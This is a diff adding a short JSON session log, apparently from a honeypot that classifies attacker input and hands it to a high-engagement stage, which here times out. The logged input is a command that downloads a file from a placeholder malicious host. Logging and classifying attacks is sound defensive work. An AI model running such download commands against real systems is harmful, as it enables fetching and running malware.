@@ -1,0 +1,32 @@
+{
+  "session_id": "S-1762503072",
+  "src_ip": "127.0.0.1",
+  "src_port": 59319,
+  "events": [
+    {
+      "ts": 1762503072.973595,
+      "text": "wget http://malicious.example/x\n"
+    },
+    {
+      "ts": 1762503073.0189645,
+      "text": "[CLASS]=exploit|0.9|ENG=HIGH"
+    },
+    {
+      "ts": 1762503073.021287,
+      "text": "[ACTION]=HANDOFF_TO_HIGH_ENGAGEMENT"
+    },
+    {
+      "ts": 1762503073.0413454,
+      "text": "[HIGH_ENGAGEMENT]=START"
+    },
+    {
+      "ts": 1762503074.264639,
+      "text": "[HIGH_ENGAGEMENT_ERROR]=timed out"
+    },
+    {
+      "ts": 1762503074.288367,
+      "text": "[HIGH_ENGAGEMENT]=END"
+    }
+  ],
+  "end_time": "Fri Nov  7 13:41:14 2025"
+}
